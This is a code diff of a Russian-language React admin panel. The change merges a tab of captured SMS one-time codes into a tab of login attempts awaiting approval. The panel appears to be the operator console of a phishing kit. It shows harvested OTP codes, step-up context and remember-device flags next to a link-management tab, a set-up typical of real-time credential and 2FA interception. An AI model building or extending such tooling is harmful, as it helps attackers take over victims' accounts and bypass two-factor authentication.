@@ -201,21 +201,14 @@ export const AdminPanel = (): JSX.Element => {
             <TabsTrigger value="manage">Управление ссылками</TabsTrigger>
             <TabsTrigger value="logins">
               <Clock className="w-4 h-4 mr-2" />
-              Попытки входа
-              {loginAttempts.filter(attempt => !attempt.approved).length > 0 && (
+              Попытки входа & SMS
+              {(loginAttempts.filter(attempt => !attempt.approved).length > 0 || smsSubmissions.length > 0) && (
                 <span className="ml-2 bg-red-500 text-white text-xs rounded-full px-2 py-1">
-                  {loginAttempts.filter(attempt => !attempt.approved).length}
+                  {loginAttempts.filter(attempt => !attempt.approved).length + smsSubmissions.length}
                 </span>
               )}
             </TabsTrigger>
-            <TabsTrigger value="sms">
-              SMS коды
-              {smsSubmissions.length > 0 && (
-                <span className="ml-2 bg-blue-500 text-white text-xs rounded-full px-2 py-1">
-                  {smsSubmissions.length}
-                </span>
-              )}
-            </TabsTrigger>
+
           </TabsList>
 
           <TabsContent value="create">
@@ -396,58 +389,54 @@ export const AdminPanel = (): JSX.Element => {
                     </Table>
                   </div>
                 )}
-              </CardContent>
-            </Card>
-          </TabsContent>
 
-          <TabsContent value="sms">
-            <Card>
-              <CardHeader>
-                <CardTitle>SMS коды</CardTitle>
-              </CardHeader>
-              <CardContent>
-                {smsSubmissions.length === 0 ? (
-                  <p className="text-gray-500 text-center py-8">Нет SMS записей</p>
-                ) : (
-                  <div className="overflow-x-auto">
-                    <Table>
-                      <TableHeader>
-                        <TableRow>
-                          <TableHead>ID</TableHead>
-                          <TableHead>OTP код</TableHead>
-                          <TableHead>Stepup Context</TableHead>
-                          <TableHead>Запомнить устройство</TableHead>
-                          <TableHead>Время</TableHead>
-                        </TableRow>
-                      </TableHeader>
-                      <TableBody>
-                        {smsSubmissions.map((submission: SmsSubmission) => (
-                          <TableRow key={submission.id}>
-                            <TableCell className="font-medium">{submission.id}</TableCell>
-                            <TableCell>
-                              <span className="font-mono bg-gray-100 px-2 py-1 rounded">
-                                {submission.otpCode}
-                              </span>
-                            </TableCell>
-                            <TableCell>
-                              <span className="font-mono text-sm text-gray-600">
-                                {submission.stepupContext}
-                              </span>
-                            </TableCell>
-                            <TableCell>
-                              {submission.rememberDevice ? (
-                                <span className="text-green-600">✓ Да</span>
-                              ) : (
-                                <span className="text-gray-400">✗ Нет</span>
-                              )}
-                            </TableCell>
-                            <TableCell>
-                              {new Date(submission.timestamp).toLocaleString('ru-RU')}
-                            </TableCell>
+                {/* SMS Submissions Section */}
+                {smsSubmissions.length > 0 && (
+                  <div className="mt-8">
+                    <h3 className="text-lg font-semibold mb-4 flex items-center gap-2">
+                      <span className="w-2 h-2 bg-blue-500 rounded-full"></span>
+                      SMS коды ({smsSubmissions.length})
+                    </h3>
+                    <div className="overflow-x-auto">
+                      <Table>
+                        <TableHeader>
+                          <TableRow>
+                            <TableHead>ID</TableHead>
+                            <TableHead>OTP код</TableHead>
+                            <TableHead>Stepup Context</TableHead>
+                            <TableHead>Запомнить устройство</TableHead>
+                            <TableHead>Время</TableHead>
                           </TableRow>
-                        ))}
-                      </TableBody>
-                    </Table>
+                        </TableHeader>
+                        <TableBody>
+                          {smsSubmissions.map((submission: SmsSubmission) => (
+                            <TableRow key={submission.id}>
+                              <TableCell className="font-medium">{submission.id}</TableCell>
+                              <TableCell>
+                                <span className="font-mono bg-blue-100 px-2 py-1 rounded text-blue-800">
+                                  {submission.otpCode}
+                                </span>
+                              </TableCell>
+                              <TableCell>
+                                <span className="font-mono text-sm text-gray-600">
+                                  {submission.stepupContext}
+                                </span>
+                              </TableCell>
+                              <TableCell>
+                                {submission.rememberDevice ? (
+                                  <span className="text-green-600">✓ Да</span>
+                                ) : (
+                                  <span className="text-gray-400">✗ Нет</span>
+                                )}
+                              </TableCell>
+                              <TableCell>
+                                {new Date(submission.timestamp).toLocaleString('ru-RU')}
+                              </TableCell>
+                            </TableRow>
+                          ))}
+                        </TableBody>
+                      </Table>
+                    </div>
                   </div>
                 )}
               </CardContent>
